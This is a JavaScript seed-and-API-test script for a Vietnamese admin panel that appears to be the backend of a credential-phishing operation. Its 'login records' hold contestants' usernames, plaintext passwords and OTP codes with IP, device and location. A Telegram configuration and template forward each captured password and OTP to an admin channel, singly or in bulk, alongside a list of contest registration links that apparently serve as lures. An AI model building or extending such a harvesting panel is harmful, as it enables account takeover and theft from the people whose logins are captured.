// demo.js - Sample Data & API Testing
const axios = require('axios');

// Base URL for API
const API_BASE_URL = 'http://localhost:5000/api';

// Sample data for testing
const sampleData = {
  // Sample users
  users: [
    {
      name: 'Super Admin',
      email: 'superadmin@admin.com',
      password: 'SuperAdmin123!',
      role: 'superadmin'
    },
    {
      name: 'Manager User',
      email: 'manager@admin.com',
      password: 'Manager123!',
      role: 'manager'
    },
    {
      name: 'Editor User',
      email: 'editor@admin.com',
      password: 'Editor123!',
      role: 'editor'
    }
  ],

  // Sample login records
  loginRecords: [
    {
      contestName: 'Miss Universe Vietnam 2024',
      username: 'thisinh001',
      password: 'Beauty2024!',
      otpCode: '123456',
      ipAddress: '192.168.1.100',
      device: 'iPhone 15 Pro',
      location: {
        country: 'Vietnam',
        city: 'Hà Nội'
      },
      status: 'success'
    },
    {
      contestName: 'The Voice Việt Nam 2024',
      username: 'singer2024',
      password: 'Voice123!',
      otpCode: '789012',
      ipAddress: '203.113.185.45',
      device: 'Samsung Galaxy S24',
      location: {
        country: 'Vietnam',
        city: 'TP.HCM'
      },
      status: 'failed'
    },
    {
      contestName: 'Vietnam Idol 2024',
      username: 'idol_participant',
      password: 'Idol2024!',
      otpCode: '345678',
      ipAddress: '171.244.130.22',
      device: 'MacBook Pro M3',
      location: {
        country: 'Vietnam',
        city: 'Đà Nẵng'
      },
      status: 'pending'
    },
    {
      contestName: 'Vietnam Next Top Model',
      username: 'model_2024',
      password: 'Model123!',
      otpCode: '567890',
      ipAddress: '1.53.254.12',
      device: 'iPad Air',
      location: {
        country: 'Vietnam',
        city: 'Cần Thơ'
      },
      status: 'success'
    },
    {
      contestName: 'Hoa hậu Hoàn vũ Nhí',
      username: 'kidpageant',
      password: 'Kid2024!',
      otpCode: '012345',
      ipAddress: '14.160.45.78',
      device: 'Chrome/Windows',
      location: {
        country: 'Vietnam',
        city: 'Huế'
      },
      status: 'success'
    }
  ],

  // Sample links
  links: [
    {
      title: 'Link đăng ký Miss Universe Vietnam 2024',
      url: 'https://missuniversevietnam.org/registration',
      category: 'Cuộc thi sắc đẹp',
      description: 'Form đăng ký chính thức cuộc thi Miss Universe Vietnam',
      status: 'active'
    },
    {
      title: 'The Voice Việt Nam - Gửi bài dự thi',
      url: 'https://thevoicevietnam.vn/audition',
      category: 'Cuộc thi âm nhạc',
      description: 'Trang gửi bài dự thi The Voice Việt Nam online',
      status: 'active'
    },
    {
      title: 'Vietnam Idol Online Registration',
      url: 'https://vietnamidol.vtvcab.vn/register',
      category: 'Cuộc thi âm nhạc',
      description: 'Đăng ký tham gia Vietnam Idol online',
      status: 'inactive'
    },
    {
      title: 'Vietnam Next Top Model Casting',
      url: 'https://vntm.vn/casting-2024',
      category: 'Cuộc thi người mẫu',
      description: 'Casting call Vietnam Next Top Model 2024',
      status: 'scheduled'
    }
  ],

  // Sample IP records
  ipRecords: [
    {
      ipAddress: '192.168.1.100',
      user: 'thisinh001',
      location: {
        country: 'Vietnam',
        city: 'Hà Nội',
        region: 'Đông Anh'
      },
      device: 'iPhone 15 Pro/iOS 17',
      status: 'allowed'
    },
    {
      ipAddress: '203.113.185.45',
      user: 'singer2024',
      location: {
        country: 'Vietnam',
        city: 'TP.HCM',
        region: 'Quận 1'
      },
      device: 'Samsung Galaxy S24/Android 14',
      status: 'blocked',
      blockReason: 'Multiple failed login attempts'
    },
    {
      ipAddress: '171.244.130.22',
      user: 'idol_participant',
      location: {
        country: 'Vietnam',
        city: 'Đà Nẵng',
        region: 'Hải Châu'
      },
      device: 'MacBook Pro/macOS Sonoma',
      status: 'suspicious'
    }
  ],

  // Sample contests
  contests: [
    {
      name: 'Miss Universe Vietnam 2024',
      description: 'Cuộc thi sắc đẹp quốc gia hàng đầu',
      startDate: '2024-04-01',
      endDate: '2024-12-31',
      status: 'active',
      maxContestants: 100
    },
    {
      name: 'The Voice Việt Nam 2024',
      description: 'Cuộc thi âm nhạc uy tín',
      startDate: '2024-03-15',
      endDate: '2024-11-30',
      status: 'active',
      maxContestants: 500
    },
    {
      name: 'Vietnam Idol 2024',
      description: 'Tìm kiếm thần tượng âm nhạc',
      startDate: '2024-05-01',
      endDate: '2024-10-31',
      status: 'draft',
      maxContestants: 300
    }
  ],

  // Sample contestants
  contestants: [
    {
      name: 'Nguyễn Thu Hà',
      number: 'SBD001',
      email: 'thuha@email.com',
      phone: '0901234567',
      description: 'Sinh viên ngành Luật, có niềm đam mê với thời trang và làm từ thiện',
      status: 'active',
      personalInfo: {
        dateOfBirth: '2000-05-15',
        address: 'Hà Nội',
        occupation: 'Sinh viên',
        education: 'Đại học Luật Hà Nội',
        height: 170,
        weight: 55
      },
      socialMedia: {
        facebook: 'https://facebook.com/thuha',
        instagram: 'https://instagram.com/thuha'
      }
    },
    {
      name: 'Trần Minh Anh',
      number: 'SBD002',
      email: 'minhanh@email.com',
      phone: '0907654321',
      description: 'Ca sĩ trẻ tài năng với giọng hát nội lực',
      status: 'pending',
      personalInfo: {
        dateOfBirth: '1998-08-22',
        address: 'TP.HCM',
        occupation: 'Ca sĩ',
        education: 'Nhạc viện TP.HCM',
        height: 165,
        weight: 60
      }
    },
    {
      name: 'Lê Thị Bình',
      number: 'SBD003',
      email: 'thibinh@email.com',
      phone: '0912345678',
      description: 'Người mẫu chuyên nghiệp với kinh nghiệm 3 năm',
      status: 'rejected',
      personalInfo: {
        dateOfBirth: '1999-12-10',
        address: 'Đà Nẵng',
        occupation: 'Người mẫu',
        education: 'Đại học Kiến trúc Đà Nẵng',
        height: 175,
        weight: 52
      }
    }
  ],

  // Sample Telegram configuration
  telegramConfig: {
    botToken: '5987654321:AAExampleBotTokenForLoginNotifications',
    chatId: '@admin_notifications',
    channelName: 'Admin Notifications',
    isActive: true,
    autoSendLogin: {
      success: true,
      failed: true,
      otpGenerated: false
    },
    messageTemplate: {
      login: `🔐 THÔNG TIN ĐĂNG NHẬP

📋 Cuộc thi: {{contestName}}
👤 Username: {{username}}
🔑 Password: {{password}}
🔐 OTP: {{otpCode}}
⏰ Thời gian: {{timestamp}}
🌐 IP: {{ipAddress}}
📱 Device: {{device}}
{{#if location}}📍 Vị trí: {{location}}{{/if}}
{{statusIcon}} Trạng thái: {{status}}`,
      bulk: `📊 BÁO CÁO ĐĂNG NHẬP HÀNG LOẠT

📅 Thời gian: {{timestamp}}
📋 Số lượng: {{count}} bản ghi
✅ Thành công: {{successCount}}
❌ Thất bại: {{failedCount}}
⏳ Đang chờ: {{pendingCount}}`
    }
  },

  // Sample articles
  articles: [
    {
      title: 'Thông báo cuộc thi Miss Universe Vietnam 2024',
      content: '<h1>Cuộc thi Miss Universe Vietnam 2024 chính thức khai mạc</h1><p>Với chủ đề "Tỏa sáng bản thân", cuộc thi năm nay hứa hẹn sẽ mang đến nhiều điều bất ngờ...</p>',
      excerpt: 'Cuộc thi Miss Universe Vietnam 2024 chính thức khai mạc với nhiều hoạt động hấp dẫn',
      category: 'Thông báo',
      tags: ['miss universe', 'hoa hậu', 'sắc đẹp'],
      status: 'published'
    },
    {
      title: 'Hướng dẫn đăng ký tham gia The Voice Việt Nam',
      content: '<h1>Cách thức đăng ký tham gia The Voice Việt Nam 2024</h1><p>Các bạn có thể đăng ký qua website chính thức...</p>',
      excerpt: 'Hướng dẫn chi tiết các bước đăng ký tham gia The Voice Việt Nam 2024',
      category: 'Hướng dẫn',
      tags: ['the voice', 'âm nhạc', 'hướng dẫn'],
      status: 'published'
    }
  ],

  // Sample web notifications
  webNotifications: [
    {
      title: 'Chào mừng đến với hệ thống',
      content: 'Chào mừng bạn đến với hệ thống quản lý admin',
      type: 'toast',
      status: 'active',
      targeting: {
        audience: 'all',
        devices: ['desktop', 'mobile']
      },
      settings: {
        autoHide: {
          enabled: true,
          delay: 5000
        },
        closable: true
      }
    },
    {
      title: 'Thông báo bảo trì hệ thống',
      content: 'Hệ thống sẽ được bảo trì vào 2:00 sáng ngày mai',
      type: 'banner',
      status: 'scheduled',
      schedule: {
        startDate: '2024-03-20T00:00:00Z',
        endDate: '2024-03-21T00:00:00Z'
      }
    }
  ]
};

// API Test Functions
class APITester {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.authToken = null;
    this.testResults = [];
  }

  // Helper method to make authenticated requests
  async request(method, endpoint, data = null, headers = {}) {
    const config = {
      method,
      url: `${this.baseURL}${endpoint}`,
      headers: {
        'Content-Type': 'application/json',
        ...headers
      }
    };

    if (this.authToken) {
      config.headers['Authorization'] = `Bearer ${this.authToken}`;
    }

    if (data) {
      config.data = data;
    }

    try {
      const response = await axios(config);
      return { success: true, data: response.data, status: response.status };
    } catch (error) {
      return { 
        success: false, 
        error: error.response?.data || error.message,
        status: error.response?.status || 0
      };
    }
  }

  // Test authentication
  async testAuth() {
    console.log('\n🔐 Testing Authentication...');
    
    // Test invalid login
    let result = await this.request('POST', '/auth/login', {
      email: 'invalid@email.com',
      password: 'wrongpassword'
    });
    
    this.logTest('Invalid Login', result.success === false, result);

    // Test valid login
    result = await this.request('POST', '/auth/login', {
      email: 'superadmin@admin.com',
      password: 'SuperAdmin123!'
    });
    
    if (result.success) {
      this.authToken = result.data.token;
      this.logTest('Valid Login', true, result);
    } else {
      this.logTest('Valid Login', false, result);
      return false;
    }

    // Test protected route
    result = await this.request('GET', '/auth/profile');
    this.logTest('Protected Route Access', result.success, result);

    return true;
  }

  // Test login records CRUD
  async testLoginRecords() {
    console.log('\n📝 Testing Login Records...');

    // Create login record
    let result = await this.request('POST', '/login-records', sampleData.loginRecords[0]);
    this.logTest('Create Login Record', result.success, result);
    
    let recordId = result.success ? result.data.record._id : null;

    // Get all login records
    result = await this.request('GET', '/login-records?page=1&limit=10');
    this.logTest('Get All Login Records', result.success && result.data.records.length > 0, result);

    // Get single record
    if (recordId) {
      result = await this.request('GET', `/login-records/${recordId}`);
      this.logTest('Get Single Login Record', result.success, result);

      // Update record
      result = await this.request('PUT', `/login-records/${recordId}`, {
        status: 'success',
        device: 'Updated Device'
      });
      this.logTest('Update Login Record', result.success, result);

      // Send notification
      result = await this.request('POST', `/login-records/${recordId}/send-notification`, {
        email: true,
        sms: false
      });
      this.logTest('Send Notification', result.success === false || result.success, result); // May fail if email not configured

      // Send Telegram
      result = await this.request('POST', `/login-records/${recordId}/send-telegram`);
      this.logTest('Send Telegram', result.success === false || result.success, result); // May fail if Telegram not configured
    }

    // Test statistics
    result = await this.request('GET', '/login-records/statistics');
    this.logTest('Get Statistics', result.success, result);
  }

  // Test Telegram integration
  async testTelegram() {
    console.log('\n🤖 Testing Telegram Integration...');

    // Update Telegram config
    let result = await this.request('PUT', '/telegram/config', sampleData.telegramConfig);
    this.logTest('Update Telegram Config', result.success, result);

    // Test connection
    result = await this.request('POST', '/telegram/test-connection');
    this.logTest('Test Telegram Connection', result.success === false || result.success, result);

    // Send test message
    result = await this.request('POST', '/telegram/send-test', {
      message: 'Test message from API'
    });
    this.logTest('Send Test Message', result.success === false || result.success, result);

    // Get statistics
    result = await this.request('GET', '/telegram/statistics');
    this.logTest('Get Telegram Statistics', result.success, result);
  }

  // Test links management
  async testLinks() {
    console.log('\n🔗 Testing Links Management...');

    // Create link
    let result = await this.request('POST', '/links', sampleData.links[0]);
    this.logTest('Create Link', result.success, result);
    
    let linkId = result.success ? result.data.link._id : null;

    // Get all links
    result = await this.request('GET', '/links?page=1&limit=10');
    this.logTest('Get All Links', result.success && result.data.links.length > 0, result);

    // Update link
    if (linkId) {
      result = await this.request('PUT', `/links/${linkId}`, {
        title: 'Updated Link Title',
        status: 'active'
      });
      this.logTest('Update Link', result.success, result);
    }

    // Get statistics
    result = await this.request('GET', '/links/statistics');
    this.logTest('Get Link Statistics', result.success, result);
  }

  // Test IP management
  async testIPs() {
    console.log('\n🛡️ Testing IP Management...');

    // Create IP record
    let result = await this.request('POST', '/ips', sampleData.ipRecords[0]);
    this.logTest('Create IP Record', result.success, result);

    // Get all IPs
    result = await this.request('GET', '/ips?page=1&limit=10');
    this.logTest('Get All IP Records', result.success, result);

    // Block IP
    result = await this.request('POST', '/ips/block', {
      ipAddress: '192.168.1.200',
      blockReason: 'Test block',
      blockUntil: new Date(Date.now() + 86400000).toISOString() // 24 hours
    });
    this.logTest('Block IP', result.success, result);
  }

  // Test bulk operations
  async testBulkOperations() {
    console.log('\n🔄 Testing Bulk Operations...');

    // Create multiple login records
    const recordIds = [];
    for (let i = 0; i < 3; i++) {
      const result = await this.request('POST', '/login-records', {
        ...sampleData.loginRecords[i],
        username: `${sampleData.loginRecords[i].username}_${i}`
      });
      if (result.success) {
        recordIds.push(result.data.record._id);
      }
    }

    if (recordIds.length > 0) {
      // Bulk send notifications
      let result = await this.request('POST', '/login-records/bulk/send-notifications', {
        recordIds,
        email: true,
        sms: false
      });
      this.logTest('Bulk Send Notifications', result.success === false || result.success, result);

      // Bulk send Telegram
      result = await this.request('POST', '/login-records/bulk/send-telegram', {
        recordIds,
        format: 'detailed'
      });
      this.logTest('Bulk Send Telegram', result.success === false || result.success, result);
    }
  }

  // Test error handling
  async testErrorHandling() {
    console.log('\n❌ Testing Error Handling...');

    // Test validation errors
    let result = await this.request('POST', '/login-records', {
      contestName: '', // Empty required field
      username: 'test'
      // Missing required fields
    });
    this.logTest('Validation Error', result.success === false && result.status === 400, result);

    // Test not found error
    result = await this.request('GET', '/login-records/507f1f77bcf86cd799439011'); // Non-existent ID
    this.logTest('Not Found Error', result.success === false && result.status === 404, result);

    // Test unauthorized access (without token)
    const tempToken = this.authToken;
    this.authToken = null;
    result = await this.request('GET', '/login-records');
    this.logTest('Unauthorized Access', result.success === false && result.status === 401, result);
    this.authToken = tempToken;

    // Test forbidden access (insufficient permissions)
    result = await this.request('POST', '/auth/register', {
      name: 'Test User',
      email: 'test@test.com',
      password: 'Password123!',
      role: 'superadmin' // Only superadmin can create superadmin
    });
    this.logTest('Forbidden Access', result.success === false || result.success, result);
  }

  // Helper method to log test results
  logTest(testName, passed, result) {
    const status = passed ? '✅ PASS' : '❌ FAIL';
    console.log(`${status} ${testName}`);
    
    if (!passed && result.error) {
      console.log(`   Error: ${JSON.stringify(result.error, null, 2)}`);
    }
    
    this.testResults.push({
      name: testName,
      passed,
      result
    });
  }

  // Run all tests
  async runAllTests() {
    console.log('🚀 Starting API Tests...\n');
    
    const authSuccess = await this.testAuth();
    if (!authSuccess) {
      console.log('\n❌ Authentication failed. Stopping tests.');
      return;
    }

    await this.testLoginRecords();
    await this.testTelegram();
    await this.testLinks();
    await this.testIPs();
    await this.testBulkOperations();
    await this.testErrorHandling();

    // Print summary
    this.printSummary();
  }

  // Print test summary
  printSummary() {
    console.log('\n📊 Test Summary:');
    console.log('================');
    
    const totalTests = this.testResults.length;
    const passedTests = this.testResults.filter(t => t.passed).length;
    const failedTests = totalTests - passedTests;

    console.log(`Total Tests: ${totalTests}`);
    console.log(`Passed: ${passedTests} ✅`);
    console.log(`Failed: ${failedTests} ❌`);
    console.log(`Success Rate: ${Math.round((passedTests / totalTests) * 100)}%`);

    if (failedTests > 0) {
      console.log('\nFailed Tests:');
      this.testResults
        .filter(t => !t.passed)
        .forEach(t => console.log(`- ${t.name}`));
    }
  }
}

// Database seed function
const seedDatabase = async () => {
  console.log('🌱 Seeding database with sample data...');
  
  const tester = new APITester(API_BASE_URL);
  
  try {
    // Login as superadmin to seed data
    const loginResult = await tester.request('POST', '/auth/login', {
      email: 'superadmin@admin.com',
      password: 'SuperAdmin123!'
    });

    if (!loginResult.success) {
      console.log('❌ Failed to login for seeding');
      return;
    }

    tester.authToken = loginResult.data.token;

    // Seed login records
    console.log('📝 Seeding login records...');
    for (const record of sampleData.loginRecords) {
      await tester.request('POST', '/login-records', record);
    }

    // Seed links
    console.log('🔗 Seeding links...');
    for (const link of sampleData.links) {
      await tester.request('POST', '/links', link);
    }

    // Seed IP records
    console.log('🛡️ Seeding IP records...');
    for (const ip of sampleData.ipRecords) {
      await tester.request('POST', '/ips', ip);
    }

    // Configure Telegram
    console.log('🤖 Configuring Telegram...');
    await tester.request('PUT', '/telegram/config', sampleData.telegramConfig);

    console.log('✅ Database seeded successfully!');
  } catch (error) {
    console.error('❌ Error seeding database:', error);
  }
};

// Run tests or seed database based on command line argument
const command = process.argv[2];

if (command === 'seed') {
  seedDatabase();
} else if (command === 'test') {
  const tester = new APITester(API_BASE_URL);
  tester.runAllTests();
} else {
  console.log('Usage:');
  console.log('  node demo.js seed  - Seed database with sample data');
  console.log('  node demo.js test  - Run API tests');
  console.log('\nMake sure the server is running on http://localhost:5000');
}

module.exports = {
  sampleData,
  APITester
};